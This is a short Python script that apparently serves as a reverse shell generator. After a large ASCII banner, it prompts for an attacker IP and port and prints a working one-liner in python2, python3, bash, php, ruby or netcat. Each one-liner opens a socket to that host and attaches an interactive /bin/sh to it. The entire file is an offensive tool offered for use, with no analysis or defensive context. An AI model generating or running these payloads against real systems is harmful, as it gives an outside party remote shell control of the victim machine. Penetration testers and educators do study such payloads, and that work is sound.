#!/usr/bin/env python3
print('''                                                                                                                                                         
@@@@@@@    @@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@           @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@    @@@@@@   @@@@@@@   @@@@@@   @@@@@@@   
@@@@@@@@  @@@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@          @@@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  !@@       @@!  @@@  @@!       @@!       @@!          !@@        @@!       @@!@!@@@  @@!       @@!  @@@  @@!  @@@    @@!    @@!  @@@  @@!  @@@  
!@!  @!@  !@!       !@!  @!@  !@!       !@!       !@!          !@!        !@!       !@!!@!@!  !@!       !@!  @!@  !@!  @!@    !@!    !@!  @!@  !@!  @!@  
@!@!!@!   !!@@!!    @!@!@!@!  @!!!:!    @!!       @!!          !@! @!@!@  @!!!:!    @!@ !!@!  @!!!:!    @!@!!@!   @!@!@!@!    @!!    @!@  !@!  @!@!!@!   
!!@!@!     !!@!!!   !!!@!!!!  !!!!!:    !!!       !!!          !!! !!@!!  !!!!!:    !@!  !!!  !!!!!:    !!@!@!    !!!@!!!!    !!!    !@!  !!!  !!@!@!    
!!: :!!        !:!  !!:  !!!  !!:       !!:       !!:          :!!   !!:  !!:       !!:  !!!  !!:       !!: :!!   !!:  !!!    !!:    !!:  !!!  !!: :!!   
:!:  !:!      !:!   :!:  !:!  :!:        :!:       :!:         :!:   !::  :!:       :!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:  !:!  
::   :::  :::: ::   ::   :::   :: ::::   :: ::::   :: ::::      ::: ::::   :: ::::   ::   ::   :: ::::  ::   :::  ::   :::     ::    ::::: ::  ::   :::  
 :   : :  :: : :     :   : :  : :: ::   : :: : :  : :: : :      :: :: :   : :: ::   ::    :   : :: ::    :   : :   :   : :     :      : :  :    :   : :  
                                                                                                                                                          -@hac10101''')

ip=input("Put your ip here ")
port=input("Put your port here ")
#python2 ,python3 ,php,bash,perl,ruby,netcat,java
payload_var=("1.python2\n2.python3\n3.bash\n4.php\n5.ruby\n6.netcat\n")
print(payload_var)
payload=input("which one you want to use ")
payload_int=int(payload)

if payload_int==1:
    py2='''python -c'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''.format(ip,port)
    print(py2)
elif payload_int==2:
    py3='''python3 -c'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''.format(ip,port)
    print(py3)
elif payload_int==3:
   bash='''bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1' '''.format(ip,port)
   print(bash)
elif payload_int==4:
    php='''php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");' '''.format(ip,port)
    print(php)
elif payload_int==5:
    ruby='''ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''.format(ip,port)
    print(ruby)
elif payload_int==6:
    netcat='''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f '''.format(ip,port)
    print(netcat)
else:
    print("you have choosed nothing")
    
#payloads were taken from pentestmonkey 
